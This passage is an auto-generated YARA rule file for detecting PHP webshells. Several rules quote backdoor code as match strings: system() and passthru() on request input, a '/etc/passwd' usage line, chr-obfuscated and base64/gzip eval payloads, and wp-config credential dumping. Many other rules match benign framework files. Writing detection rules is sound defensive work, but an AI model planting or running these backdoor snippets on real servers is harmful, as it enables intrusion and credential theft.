      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule activeLink
{
   meta:
      description = "php17 - file activeLink.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ad98c9c88afcf1a2f114d55443108c4324a3995622c1d6b3df7b249cffe1ab30"
   strings:
      $s1 = "$ALRowsCount=SQLAdopt::GetPageCount($activeLinkmodelnull);" fullword ascii
      $s2 = "buildPageSeletor('activeLink',$ALRowsCount,$perPageCount,$nowPage,'activeLinkList');" fullword ascii
      $s3 = "* Date: 15/2/4" fullword ascii
      $s4 = "@$jumpPage=$_POST[\"page\"];" fullword ascii
      $s5 = "include_once(dirname(__FILE__).'/../common.php');" fullword ascii
      $s6 = "include_once(dirname(__FILE__).'/../DBAdopt/_class/BLL/operator.php');" fullword ascii
      $s7 = "$activeLinkmodelnull=new activeLinkModel('','','');" fullword ascii
      $s8 = "<div id=\"activeLinkList\" name=\"list\">" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      all of them
}

rule AbstractSyntaxTree
{
   meta:
      description = "php17 - file AbstractSyntaxTree.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9352347cc1b017fc607d21b5ea06ec6d7441480900cb1f61d2c0847bce9385a7"
   strings:
      $s1 = "* @license   https://github.com/opulencephp/Opulence/blob/master/LICENSE.md" fullword ascii
      $s2 = "* @link      https://www.opulencephp.com" fullword ascii
      $s3 = "* Gets the current node" fullword ascii
      $s4 = "* @return RootNode The root node" fullword ascii
      $s5 = "* @copyright Copyright (C) 2017 David Young" fullword ascii
      $s6 = "use Opulence\\Views\\Compilers\\Fortune\\Parsers\\Nodes\\RootNode;" fullword ascii
      $s7 = "* Clears all the non-root nodes" fullword ascii
      $s8 = "public function getRootNode() : RootNode" fullword ascii
      $s9 = "* Defines a view abstract syntax tree" fullword ascii
      $s10 = "* @param Node $node The node to set" fullword ascii
      $s11 = "* @return Node The current node" fullword ascii
      $s12 = "/** @var RootNode The root node */" fullword ascii
      $s13 = "use Opulence\\Views\\Compilers\\Fortune\\Parsers\\Nodes\\Node;" fullword ascii
      $s14 = "* Sets the current node" fullword ascii
      $s15 = "namespace Opulence\\Views\\Compilers\\Fortune\\Parsers;" fullword ascii
      $s16 = "private $rootNode = null;" fullword ascii
      $s17 = "public function getCurrentNode() : Node" fullword ascii
      $s18 = "* Opulence" fullword ascii
      $s19 = "/** @var Node The current node */" fullword ascii
      $s20 = "$this->setCurrentNode($this->rootNode);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_05a70454516ecd9194c293b0e415777f
{
   meta:
      description = "php17 - file 05a70454516ecd9194c293b0e415777f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "40c48046580b66d7651f993380e92cf3e0931261134626e52e7be96132341e00"
   strings:
      $x1 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword ascii
      $s2 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->" fullword ascii
      $s3 = "<!--    http://michaeldaw.org   2006    -->" fullword ascii
      $s4 = "system($cmd);" fullword ascii
      $s5 = "$cmd = ($_REQUEST['cmd']);" fullword ascii
      $s6 = "if(isset($_REQUEST['cmd'])){" fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 1KB and
      1 of ($x*) and all of them
}

rule sig_076a0c97d09cf1a0ec3e19c7f2529f2b
{
   meta:
      description = "php17 - file 076a0c97d09cf1a0ec3e19c7f2529f2b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "da3868f0db6e3d32e471829a0cda86c2185af08c0bf0c93ab37e9a177fb4c5e4"
   strings:
      $x1 = "/* Get a base64 encoded string wich contains the args to execute */" fullword ascii
      $x2 = "-Execute commands directly as in a terminal-like way (it needs system, passthru or other similar function)" fullword ascii
      $s3 = "/* Process HTTP Request Headers from client */" fullword ascii
      $s4 = "dump(base64_decode($commands[1]));" fullword ascii
      $s5 = "/* include wp-config.php. This allow us to use the credentials directly */" fullword ascii
      $s6 = "-Load wp-config.php (enable direct usage of credentials)" fullword ascii
      $s7 = "@$data = array (DB_NAME, DB_USER, DB_PASSWORD, DB_HOST, DB_PREFIX);" fullword ascii
      $s8 = "-Password Protected using HTTP headers" fullword ascii
      $s9 = "-Commands are sent by unique HTTP headers" fullword ascii
      $s10 = "$user = get_user_by('login', $login);" fullword ascii
      $s11 = "Returns an array containing user, password, host and db name" fullword ascii
      $s12 = "$link = mysql_connect(DB_HOST,DB_USER,DB_PASSWORD);" fullword ascii
      $s13 = ").\"' and table_name = '\". base64_decode($commands[2]).\"'\", DB_NAME);" fullword ascii
      $s14 = "function process_headers() {" fullword ascii
      $s15 = "process_headers();" fullword ascii
      $s16 = "$source = file_get_contents($wp_config);" fullword ascii
      $s17 = "$check = is_this_allowed(explode(\",\",base64_decode($commands[1])));" fullword ascii
      $s18 = "add_admin(base64_decode($commands[1]), base64_encode($commands[2]));" fullword ascii
      $s19 = "terminal(base64_decode($commands[1]), base64_decode($commands[2]));" fullword ascii
      $s20 = "$users = get_users ('role=administrator');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      1 of ($x*) and 4 of them
}

rule sig_20170728060000_remove_legacy_password_hashes
{
   meta:
      description = "php17 - file 20170728060000_remove_legacy_password_hashes.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1b1ffe4296dee9307d326c5036eda8913e520c93d0bdb20b1c7a3f0ea4278ea3"
   strings:
      $s1 = "* Remove legacy password hashes" fullword ascii
      $s2 = "// remove legacy 2.x password and salt columns" fullword ascii
      $s3 = "$table->removeIndexByName('password');" fullword ascii
      $s4 = "$table->removeColumn('password');" fullword ascii
      $s5 = "if ($table->hasColumn('password')) {" fullword ascii
      $s6 = "if (!$table->hasIndex('password')) {" fullword ascii
      $s7 = "if (!$this->hasTable('users_entity')) {" fullword ascii
      $s8 = "if ($table->hasIndex('password')) {" fullword ascii
      $s9 = "if (!$table->hasColumn('password')) {" fullword ascii
      $s10 = "$table->addIndex(['password'], [" fullword ascii
      $s11 = "$table->addColumn('password', 'text', [" fullword ascii
      $s12 = "$table = $this->table('users_entity');" fullword ascii
      $s13 = "class RemoveLegacyPasswordHashes extends AbstractMigration" fullword ascii
      $s14 = "'name' => 'password'," fullword ascii
      $s15 = "use Phinx\\Migration\\AbstractMigration;" fullword ascii
      $s16 = "if (!$table->hasColumn('salt')) {" fullword ascii
      $s17 = "if ($table->hasColumn('salt')) {" fullword ascii
      $s18 = "$table->addColumn('salt', 'text', [" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule sig_063e26c670d07bb7c4d30e6fc69fe056
{
   meta:
      description = "php17 - file 063e26c670d07bb7c4d30e6fc69fe056.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0b27cdb04d24b6c0f793a7a7172b69a582859e2db6c6b37cc30300030b1a86c8"
   strings:
      $s1 = "eval(\"?>\".gzuncompress(base64_decode(\"eJzlvX1XGzcTOPo3PaffQWz9dO3GGNskbWowgRBISBNIeUnShPzctb22t6y97u4aQ1I+6++r3JnRy0r7Ykzy9Ln" ascii
      $s2 = "32tYYFF3m0Nuj156lq//zzVSpRlroQDQA4rzgkXlGET/j6dhkVNdgTcG7hk0rJKZj5FAcRHxhvTnSDENCtdQMYN+NWfZMrxPDBolBGwcS/WebNhPzzL2t5XSjzjkRyBM" ascii
      $s3 = "esbGNxZWgm7Qe92RgmxqZ+HIL2Tafaq04b1WmzOt2oip4Q5yGwMjur7cnM9yv92nhQc2rc0u9sogWLmWmdTVGkpxfpieyeVkSlqSLThl5m2hAA04ZWSktNyjWNck0J0d" ascii
      $s4 = "Ellgy85IRCK5K4UsOypi/LNDlZ/FKMsOlpTjOZCx+fqsw2y9qVtjx8VMcNiSHetGyVpgBiTIJb8hhYTCJZur6SRCq7HIncoFZAYkr32L8ul7yJUD1g668289iUjJ0RDf" ascii
      $s5 = "tnf7x7VD98fnTz4d1B/cPpUzGETnA405CCz5TW3XhK9cLQeg1DSAyB67Ozxq+nJ2/fnkG9+ycHhxG0BctBmx9dIjynGYf6ywHwIXi5f3B60vjQfX1Qj07PHz2Fjjx9Xz" ascii
      $s6 = "yKvW3VBBxoGtb61rrDJYNkChcbyWGtfX52sPYY1zzD9Qy+/3Z8+HjtRH06x0+96eOffxYTNJgqc1XCYmiN6/RG5aQiJwJGxe6YzzejEDoqbAU0cYXzjWXXCLgGWpFdy5" ascii
      $s7 = "utT9I7407zGAKysTNxQBcqFoH89s600cEbiXi7sG1Zm+pWzxLMieYexhE1soSZrIcmFP30vKV0qNUd9FPu8Dy330H9A3AcHL7ah63QwP700QYB1OGXBDD6qJ4jYt0K1V" ascii
      $s8 = "n0czDzEyeIYQ8PvX36zT9CT9tj5xLdDqbkzQCKCno4TG/iETbODmfdG/gD22r4PfzsIUw3+dOEvxPCRFem4ANeaCckaS/JUh+N82FCzaVzhaWD/gZi6fZ7QegiPbMrVH" ascii
      $s9 = "71MEQHDfUIBLdz6rGN3RD2AfTArMP9BjVbhguSIOc1XeJG9i1URz5pqp2I8jeqOpxjtMPPTHieRwcPKXDjWVWHH3SYILTIyRdODUD71O0d4lPy3LMsbdp0hL1hETXpZv" ascii
      $s10 = "pCD/OiDjkBUWLNbl0AGWJOiiqp2UXNUfMcWwDESzTr1JqPLEnC9kCrbKnRk4kX+Eknwj3YE0RtNE2ynuv7whDW3qBvuELjt7rgPKpF21txCP/7Mml7Cw2N2+coM1voMY" ascii
      $s11 = "S4s9w2o7nxo7vtPfitwrKlIOhACHT7K7cIQpyJbz+jvwpKhjRZbArUngzlXWTiRqviNkbqDfHhrzJ8rRSRwU2Q2+eTXj64GWIlVRhtX1o98LU2/Jwtaz71qhtnyEVqR2" ascii
      $s12 = "T0whJNPXEdft7/FS0d3I9wPg2KeylpBOnP1AR7fAm9YPOm9Bc35bVzafSZPmHu0ar+/6I7sGHIdXthY/R++crW/Bt9pHYzmUlV1Jp9ugDzNWNMzaavnyXCcoe2kNhm+0" ascii
      $s13 = "dz+EHnpqYSjiEx9qAhNKL4wOOteAZbDfRUNRrRh8Sy/cfaeK3PXrS8ViT6XHAEbf5vPXd+6n0GTSdR/XTuHID2aeA0CyltlZcp28A5FB5My1rXUP/UqPMB8x/VL/oSiF" ascii
      $s14 = "<?php" fullword ascii
      $s15 = "t3lx5W57z7Y/jb/lMaDofP5sPXMKzcm6e++9yv//Zsf3p88/TXvOHZE59/O3gdvfSfPn9f94+h2fCZumQA5J+enB8cvXre9/uia/+Y+LM/3jVguPbrf2zsTn7ThvDh3s" ascii
      $s16 = "44vdgLJpBlH3i+G712JraePYvcjvOXcw0AcThz9SxqoRtj0XfepB/Mo7VG81EDi3//nTcor7rjaXyjMY9GyDl86+w+3z86AwZW2BdoOvyUoJ5wd+hOYqTZCUPnpmw9D4" ascii
      $s17 = "KMzrgcjc3/MY17MOjvzciN/zGRh8mMujetD//HtL4xphorW/jQhKU/gKHoFr5AC8l/pJPf0B3GKKVZ2CLhqXQQBuNcb6VUM+XbonVdURY4zoJlMMg7MviAW462vfwyT/" ascii
      $s18 = "n7lzfdjcOfD/d+H71//tD77Sw62vNO5r3xr/Xu58YEaOKfmy8fdccHMZSZ9J8fzV/eXP4C7fncbR6FH97/HpzXf312Wn97/mrv6e8n/q8vzy7p89lZ/ejV+8bR+fnl26" ascii
      $s19 = "zDykyiQraBVIUMFMQ//sjKHKmZ3oY1QMMA/7CzlyIkkTkrrh+5WE7rFDn0oDNjkG5zmITAEfhWfvPiTef4tFqvblSofmvuTSysthSgdLHhKwopgVMkTrxrLrlKkTNwO2" ascii
      $s20 = "rS2m3KfmLzbTuswy3brtTsbVVua50j3OYOECulcdLUU7dXY4eTQWC3t/ELfaxydz1MUn57uHGfwJrjYqr8WLVP//apJPyp2m9GU/yCfyDHGbiMfFowH768xs+QHod4sE" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

rule php17_404
{
   meta:
      description = "php17 - file 404.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "00772e6c4839045b73e078c73645f441daf9bfffc95f5604b6995e7792eedf66"
   strings:
      $x1 = "<html><head><meta http-equiv='Content-Type' content='text/html; charset=<?=$_POST['charset']?>'><title><?=$_SERVER['HTTP_HOST']?" ascii
      $x2 = "<div id=\"cot_tl_fixed\"><marquee>Shell - *Dr.Backd00r*  - SubhashDasyam.com</marquee></div> " fullword ascii
      $x3 = ">- 404 Not Found Shell V.<?=VERSION?>-SubhashDasyam.com</title> " fullword ascii
      $x4 = "if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) { " fullword ascii
      $x5 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit=\"if(this.ajax.checked){a(null,nul" fullword ascii
      $x6 = "$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']); " fullword ascii
      $x7 = "$str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=''\"; " fullword ascii
      $x8 = "if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") ) return true; " fullword ascii
      $x9 = "<input type=\"button\" value=\"hashcrack.com\" onclick=\"document.hf.action='http://www.hashcrack.com/index.php';document" fullword ascii
      $x10 = ".'<tr><td></td><td><label style=\"padding-left:15px\"><input type=checkbox name=reverse value=1 checked> reverse (login ->" fullword ascii
      $x11 = "Port: <input type='text' name='port' value='31337'> Password: <input type='text' name='pass' value='wso'> Using: <select nam" fullword ascii
      $x12 = "<td><input type=text name=sql_login value='<?=(empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_lo" fullword ascii
      $x13 = "<input type=\"button\" value=\"md5decrypter.com\" onclick=\"document.hf.action='http://www.md5decrypter.com/';document.hf" fullword ascii
      $x14 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror'); " fullword ascii
      $x15 = "if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") ) " fullword ascii
      $s16 = "showSecParam('Downloaders', implode(', ',$temp)); " fullword ascii
      $s17 = "'<td>:<nobr>'.substr(@php_uname(), 0, 120).'  <a href=\"http://www.google.com/search?q='.urlencode(@php_uname()).'\" targ" fullword ascii
      $s18 = "<input type=\"button\" value=\"milw0rm.com\" onclick=\"document.hf.action='http://www.milw0rm.com/cracker/search.php';doc" fullword ascii
      $s19 = "<input type=\"button\" value=\"md5.rednoize.com\" onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf." fullword ascii
      $s20 = "if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) { " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and all of them
}

rule ArticleLogic_class
{
   meta:
      description = "php17 - file ArticleLogic.class.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b27a094499b22abb13dc8933e7a045b1e68b8599a69f0a3a96b205f0996912d2"
   strings:
      $s1 = "<zuojiazi@vip.qq.com> <http://www.zjzit.cn>" fullword ascii
      $s2 = "// | Copyright (c) 2013 http://www.onethink.cn All rights reserved." fullword ascii
      $s3 = "// +----------------------------------------------------------------------" fullword ascii
      $s4 = "array('content', 'require', '" fullword ascii
      $s5 = "namespace Home\\Logic;" fullword ascii
      $s6 = "', self::MUST_VALIDATE , 'regex', self::MODEL_BOTH)," fullword ascii
      $s7 = "class ArticleLogic extends BaseLogic{" fullword ascii
      $s8 = "// | Author: " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule sig_51404e79871cd663777b69738ce8007da652ce3a
{
   meta:
      description = "php17 - file 51404e79871cd663777b69738ce8007da652ce3a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "90b86d5a932acb4c649f57184b9d7769be68258c4b428db58b3bcac9b3c6ab2e"
   strings:
      $s1 = "$headers .= \"Content-Type: text/html; charset=\\\"UTF-8\\\"\\r\\nContent-Transfer-Encoding: 8bit\\r\\n\\r\\n\";" fullword ascii
      $s2 = "$headers .= \"Content-Type: multipart/mixed; boundary=\\\"\".$rand.\"\\\"\\r\\n\\r\\n\";" fullword ascii
      $s3 = "if(send_email($mailFrom, $mailTo, $mailSubject, $mailContent, $mailAttachment)) output(\"Mail sent to \".html_safe($mailTo));" fullword ascii
      $s4 = "<tr><td colspan='2'><textarea id='mailContent' style='height:140px;min-height:140px;'></textarea></td></tr>" fullword ascii
      $s5 = "$headers .= \"Content-Type: application/octet-stream; name=\\\"\".basename($file).\"\\\"\\r\\n\";" fullword ascii
      $s6 = "$headers .= \"Content-Transfer-Encoding: base64\\r\\n\";" fullword ascii
      $s7 = "if(isset($p['mailFrom'])&&isset($p['mailTo'])&&isset($p['mailSubject'])&&isset($p['mailContent'])){" fullword ascii
      $s8 = "<tr><td>To</td><td><input type='text' id='mailTo' value='' onkeydown=\\\"trap_enter(event, 'mail_send');\\\"></td></tr>" fullword ascii
      $s9 = "$headers .= \"Content-Disposition: attachment\\r\\n\\r\\n\";" fullword ascii
      $s10 = "$content = chunk_split(base64_encode(read_file($file)));" fullword ascii
      $s11 = "$GLOBALS['module']['mail']['js_ontabselected'] = \"if(!portableMode) $('#mailFrom').focus();\";" fullword ascii
      $s12 = "$headers .= $content.\"\\r\\n\\r\\n\";" fullword ascii
      $s13 = "$headers = \"MIME-Version: 1.0\\r\\n\".$from;" fullword ascii
      $s14 = "$mailAttachment = (!empty($mailAttachment))? explode(\"{[|b374k|]}\", $p['mailAttachment']):array();" fullword ascii
      $s15 = "if(@mail($to, $subject, \"\", $headers)) return true;" fullword ascii
      $s16 = "$GLOBALS['module']['mail']['content'] = \"" fullword ascii
      $s17 = "$mailContent = trim($p['mailContent']);" fullword ascii
      $s18 = "$headers .= \"--\".$rand.\"\\r\\n\";" fullword ascii
      $s19 = "$headers .= \"--\".$rand.\"--\\r\\n\";" fullword ascii
      $s20 = "$headers .= $msg.\"\\r\\n\\r\\n\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}


rule AbstractTranslation
{
   meta:
      description = "php17 - file AbstractTranslation.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7964ad78f7cb48948c772d0f1623e667c3df1edd3152ad6dfc410aded9196722"
   strings:
      $s1 = "public function getTranslatable(): TranslatableInterface" fullword ascii
      $s2 = "* @var TranslatableInterface|null" fullword ascii
      $s3 = "public function setTranslatable(?TranslatableInterface $translatable): void" fullword ascii
      $s4 = "public function getLocale(): ?string" fullword ascii
      $s5 = "namespace Sylius\\Component\\Resource\\Model;" fullword ascii
      $s6 = "$previousTranslatable->removeTranslation($this);" fullword ascii
      $s7 = "$previousTranslatable = $this->translatable;" fullword ascii
      $s8 = "public function setLocale(?string $locale): void" fullword ascii
      $s9 = "if ($translatable === $this->translatable) {" fullword ascii
      $s10 = "$translatable->addTranslation($this);" fullword ascii
      $s11 = "$this->translatable = $translatable;" fullword ascii
      $s12 = "if (null !== $previousTranslatable) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_6439f3ffd8d0154848c1976729ced2cd4f8cb74b
{
   meta:
      description = "php17 - file 6439f3ffd8d0154848c1976729ced2cd4f8cb74b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3673b7c44df1cb296b02d93688d538a0718d348d94205cc106e5c4f00a22d063"
   strings:
      $x1 = "// https://github.com/nbs-system/php-malware-finder/commit/47d86bf92eb15fe65dd4efbc04d0004856e88ddd#commitcomment-16355734" fullword ascii
      $s2 = "print_r($_POST['funct']($_POST['argv']));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      1 of ($x*) and all of them
}

rule sig_09f23c420804be49c287e788a085886f6785b3cb
{
   meta:
      description = "php17 - file 09f23c420804be49c287e788a085886f6785b3cb.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6e86205908a663a19396bf0abc46dac6c3593d7ebc5681e2ee5a37e124a164ea"
   strings:
      $x1 = "if ((!$_POST['dir']) OR ($_POST['dir']==\"\")) { echo \"<input type=hidden name=dir size=70 value=\".exec(\"pwd\").\">\"; }" fullword ascii
      $s2 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"uname -ar ; pwd ; id ; ls -la ;\"; }" fullword ascii
      $s3 = "<!-- wp-blog-header.php which does and tells WordPress to load the theme.         -->" fullword ascii
      $s4 = "<!-- eksekusi command dengan passthru -->" fullword ascii
      $s5 = "{ echo \" <b>[Dir]</b><input type=text name=dir size=40 value=\".exec(\"pwd\").\">\"; }" fullword ascii
      $s6 = "<div>file gak isa di uplod \".$HTTP_POST_FILES[\"filenyo\"][name].\"</div></font></td></tr></table>\");" fullword ascii
      $s7 = "<!-- form eksekusi command -->" fullword ascii
      $s8 = "echo \"\".passthru($_POST['cmd']).\"\";" fullword ascii
      $s9 = "if (($HTTP_POST_FILES[\"filenyo\"]!==\"\") AND ($HTTP_POST_FILES[\"filenyo\"]))" fullword ascii
      $s10 = "copy($HTTP_POST_FILES[\"filenyo\"][tmp_name]," fullword ascii
      $s11 = "<?php if (($_POST['dir']!==\"\") AND ($_POST['dir'])) { chdir($_POST['dir']); } ?>" fullword ascii
      $s12 = "$_POST['dir'].\"/\".$HTTP_POST_FILES[\"filenyo\"][name])" fullword ascii
      $s13 = "else { echo \"<input type=hidden name=dir size=70 value=\".$_POST['dir'].\">\"; }" fullword ascii
      $s14 = "<!-- Front to the WordPress application. This file doesn't do anything, but loads -->" fullword ascii
      $s15 = "else { echo \"<input type=text name=dir size=40 value=\".$_POST['dir'].\">\"; }" fullword ascii
      $s16 = "or print(\"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><td><tr><font color=red face=arial>" fullword ascii
      $s17 = "echo \"<form name=command method=post>\";" fullword ascii
      $s18 = "echo \"<b>[CmD ]</b><input type=text name=cmd size=33>  \";" fullword ascii
      $s19 = "<!-- form upload -->" fullword ascii
      $s20 = "<!-- upload file -->" fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 6KB and
      1 of ($x*) and 4 of them
}

rule sig_3332250f9ef6724124bf613e4d216d8f210fb2a8
{
   meta:
      description = "php17 - file 3332250f9ef6724124bf613e4d216d8f210fb2a8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "fd776be1e44f6b1264730909d89bac4e53a38e3cc103d5c9ac33cb269abe7b7b"
   strings:
      $s1 = "$_= $_create_function(\"\",$_eval_post_1); //die(var_dump($_create_function ));" fullword ascii
      $s2 = "$_eval_post_1 = $_chr(101).$_chr(118).$_chr(97).$_chr(108).$_chr(40).$_chr(36).$_chr(95).$_chr(80).$_chr(79).$_chr(83).$_chr" fullword ascii
      $s3 = "$_create_function = $_chr(99).$_chr(114).$_chr(101).$_chr(97).$_chr(116).$_chr(101).$_chr(95).$_chr(102).$_chr(117).$_chr(11" fullword ascii
      $s4 = "(84).$_chr(91).$_chr(49).$_chr(93).$_chr(41).$_chr(59); //eval($_POST[1]); " fullword ascii
      $s5 = "0).$_chr(99).$_chr(116).$_chr(105).$_chr(111).$_chr(110); //create_function " fullword ascii
      $s6 = "$_chr = chr(99).chr(104).chr(114); //chr  " fullword ascii
      $s7 = "$_eval_post_1 = $_chr(101).$_chr(118).$_chr(97).$_chr(108).$_chr(40).$_chr(36).$_chr(95).$_chr(80).$_chr(79).$_chr(83).$_chr(84)" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php17_ANSI
{
   meta:
      description = "php17 - file ANSI.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f9acc648e2b0f93b3b7d43a956556cd0f2e2c4d02248b17311d4db0f9f67c00e"
   strings:
      $x1 = "* If you call read() in Net_SSH2 you may get {@link http://en.wikipedia.org/wiki/ANSI_escape_code ANSI escape codes} back." fullword ascii
      $s2 = "* color to display them in, etc. File_ANSI is a {@link http://en.wikipedia.org/wiki/VT100 VT100} terminal emulator." fullword ascii
      $s3 = "* {@link http://en.wikipedia.org/wiki/Terminal_emulator terminal emulator} how to format the characters, what" fullword ascii
      $s4 = "return '<pre style=\"color: white; background: black\" width=\"' . ($this->max_x + 1) . '\">' . $this->_getScreen() . '</pre>';" fullword ascii
      $s5 = "return '<pre style=\"color: white; background: black\" width=\"' . ($this->max_x + 1) . '\">' . $this->_getScreen() . '</pre" fullword ascii
      $s6 = "* Set the number of lines that should be logged past the terminal height" fullword ascii
      $s7 = "$this->history = array_merge($this->history, array_slice(array_splice($this->screen, $this->y + 1), 0, $this->old_y));" fullword ascii
      $s8 = "return '<pre style=\"color: white; background: black\" width=\"' . ($this->max_x + 1) . '\">' . $scrollback . '</pre>';" fullword ascii
      $s9 = "$this->history = array_merge($this->history, array_slice(array_splice($this->screen, $this->y + 1), 0, $" fullword ascii
      $s10 = "* They'd look like chr(0x1B) . '[00m' or whatever (0x1B = ESC).  They tell a" fullword ascii
      $s11 = "// http://ascii-table.com/ansi-escape-sequences-vt-100.php" fullword ascii
      $s12 = "$this->attrs[$this->y][$this->x] = '<span style=\"color: ' . $this->foreground . '; background: ' . $this->background . '\">';" fullword ascii
      $s13 = "* Also update the $this->screen and $this->history buffers" fullword ascii
      $s14 = "user_error(\"{$this->ansi} unsupported\\r\\n\");" fullword ascii
      $s15 = "* Returns the current screen without preformating" fullword ascii
      $s16 = "user_error('Unsupported attribute: ' . $mod);" fullword ascii
      $s17 = "* Returns the current screen and the x previous lines" fullword ascii
      $s18 = "$this->history_attrs = array_merge($this->history_attrs, array_slice(array_splice($this->attrs, $this->y" fullword ascii
      $s19 = "$this->attrs = array_fill(0, $this->max_y + 1, $this->attr_row);" fullword ascii
      $s20 = "* Current Column" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule sig_20171006131622_drop_groups_entity_table
{
   meta:
      description = "php17 - file 20171006131622_drop_groups_entity_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b719a07cf721dd04d0025d2c39124f7ee6928f0ee186da7b4163a57106a25a16"
   strings:
      $s1 = "// remove from groups so it does not get processed again in the next while loop" fullword ascii
      $s2 = "$this->execute(\"" fullword ascii
      $s3 = "* Move groups_entity attributes to metadata" fullword ascii
      $s4 = "$prefix = $this->getAdapter()->getOption('table_prefix');" fullword ascii
      $s5 = "$groups_query = \"SELECT * FROM {$prefix}groups_entity LIMIT 25\";" fullword ascii
      $s6 = "if (!$this->hasTable('groups_entity') || !$this->hasTable('metadata')) {" fullword ascii
      $s7 = "$cols = ['name', 'description'];" fullword ascii
      $s8 = "$this->dropTable('groups_entity');" fullword ascii
      $s9 = "while ($rows = $this->fetchAll($groups_query)) {" fullword ascii
      $s10 = "// all data migrated, so drop the table" fullword ascii
      $s11 = "use Phinx\\Migration\\AbstractMigration;" fullword ascii
      $s12 = "// remove existing metadata... attributes are more important" fullword ascii
      $s13 = "WHERE entity_guid = {$row['guid']} AND" fullword ascii
      $s14 = "class DropGroupsEntityTable extends AbstractMigration" fullword ascii
      $s15 = "DELETE FROM {$prefix}groups_entity" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule sig_9f24a056366f1b96b74846d7a664f8e93a61e7c3
{
   meta:
      description = "php17 - file 9f24a056366f1b96b74846d7a664f8e93a61e7c3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "881b8cad315d69592fd6402b4f3654f270ea155e4607b9faf470b93f13332d62"
   strings:
      $s1 = "<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['expdoor']);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AngularGuy
{
   meta:
      description = "php17 - file AngularGuy.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c0950240ba0014b9ff6ba8c9e5bf651df6f334e7d63484fd57a514625b087bfc"
   strings:
      $s1 = "* @method void execute($callable)" fullword ascii
      $s2 = "* @method void comment($description)" fullword ascii
      $s3 = "* @method void lookForwardTo($achieveValue)" fullword ascii
      $s4 = "$this->assertTrue($jsonArray->containsArray($expected), var_export($jsonArray->toArray(), true));" fullword ascii
      $s5 = "* @method \\Codeception\\Lib\\Friend haveFriend($name, $actorClass = NULL)" fullword ascii
      $s6 = "* @method void amGoingTo($argumentation)" fullword ascii
      $s7 = "* @method void wantToTest($text)" fullword ascii
      $s8 = "* @method void expect($prediction)" fullword ascii
      $s9 = "* @method void expectTo($prediction)" fullword ascii
      $s10 = "* @method void wantTo($text)" fullword ascii
      $s11 = "* @method void am($role)" fullword ascii
      $s12 = "* Inherited Methods" fullword ascii
      $s13 = "use Codeception\\Util\\Shared\\Asserts;" fullword ascii
      $s14 = "$jsonArray = new JsonArray($this->grabTextFrom(['id' => 'data']));" fullword ascii
      $s15 = "use Codeception\\Util\\JsonArray;" fullword ascii
      $s16 = "public function seeInFormResult($expected)" fullword ascii
      $s17 = "use _generated\\AngularGuyActions;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule sig_3427a489cc60f525d865570a9e0c36fd080c2b4f
{
   meta:
      description = "php17 - file 3427a489cc60f525d865570a9e0c36fd080c2b4f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a4a585ddea1d55a8050ccbf48d0aaa37708e97d1d742f0da069774fec43a7e7c"
   strings:
